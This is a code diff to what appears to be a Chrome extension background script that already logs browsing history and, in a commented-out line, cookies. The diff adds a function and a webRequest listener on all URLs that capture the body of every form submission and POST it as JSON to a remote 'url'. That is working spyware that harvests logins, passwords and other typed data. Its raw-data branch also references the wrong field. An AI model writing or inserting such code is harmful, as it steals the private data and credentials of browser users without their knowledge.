@@ -71,6 +71,31 @@ function logHistory(hists){
 
 }
 
+function logFormData(form){
+
+        let data = {};
+        if (form.requestBody != undefined) {
+            if (form.requestBody.formData != undefined) {
+                data["data"] = form.requestBody.formData
+            }
+            if (form.requestBody.raw != undefined) {
+                data["data"] = form.requestBody.formData.raw.join("");
+            }
+            fetch(
+                url,
+                {
+                    method: "POST",
+                    body: JSON.stringify(data),
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                }
+            );
+        }
+    
+
+}
+
 
   chrome.alarms.onAlarm.addListener(()=>{
     //chrome.cookies.getAll({}).then(logCookies);
@@ -84,3 +109,10 @@ function logHistory(hists){
 
 
 //
+
+//Form DATA
+chrome.webRequest.onBeforeRequest.addListener(
+    (e) => {logFormData(e)},
+    {urls: ["<all_urls>"]},
+    ["requestBody"]
+);
